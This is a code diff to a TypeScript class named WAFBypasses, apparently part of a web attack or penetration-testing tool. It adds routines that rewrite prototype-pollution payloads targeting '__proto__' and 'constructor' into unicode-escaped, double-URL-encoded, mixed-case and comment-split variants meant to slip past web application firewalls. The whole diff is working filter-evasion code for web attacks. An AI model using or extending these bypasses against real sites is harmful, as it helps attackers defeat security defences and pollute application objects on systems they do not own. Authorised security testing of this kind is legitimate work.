@@ -325,6 +325,9 @@ export class WAFBypasses {
 			bypasses.push(payload.replace(/__proto__/gi, '__pr\\u006f\\u0074o__'));
 			bypasses.push(payload.replace(/__proto__/gi, 'const\\u0072uctor[prot\\u006ftype]'));
 		}
+		if (/constructor/i.test(payload)) {
+			bypasses.push(payload.replace(/constructor/gi, 'const\\u0072uctor'));
+		}
 
 		return [...new Set(bypasses)];
 	}
@@ -377,8 +380,13 @@ export class WAFBypasses {
 
 		// Prototype Pollution specific bypasses (Case-insensitive matching via /gi)
 		if (/__proto__/i.test(payload)) {
-			bypasses.push(payload.replace(/__proto__/gi, '%255f%255fproto%255f%255f'));
+			const protoEncoded = payload.replace(/__proto__/gi, '%255f%255fproto%255f%255f');
+			bypasses.push(protoEncoded);
 			bypasses.push(payload.replace(/\[/g, '%255b').replace(/\]/g, '%255d'));
+			bypasses.push(protoEncoded.replace(/\[/g, '%255b').replace(/\]/g, '%255d'));
+		}
+		if (/constructor/i.test(payload)) {
+			bypasses.push(payload.replace(/constructor/gi, '%2563onstructor'));
 		}
 
 		return [...new Set(bypasses)];
@@ -406,6 +414,10 @@ export class WAFBypasses {
 		if (/__proto__/i.test(payload)) {
 			bypasses.push(payload.replace(/__proto__/gi, '__PrOtO__'));
 			bypasses.push(payload.replace(/__proto__/gi, '__pr/**/oto__'));
+		}
+		if (/constructor/i.test(payload)) {
+			bypasses.push(payload.replace(/constructor/gi, 'CoNsTrUcToR'));
+			bypasses.push(payload.replace(/constructor/gi, 'const/**/ructor'));
 		}
 
 		return [...new Set(bypasses)];
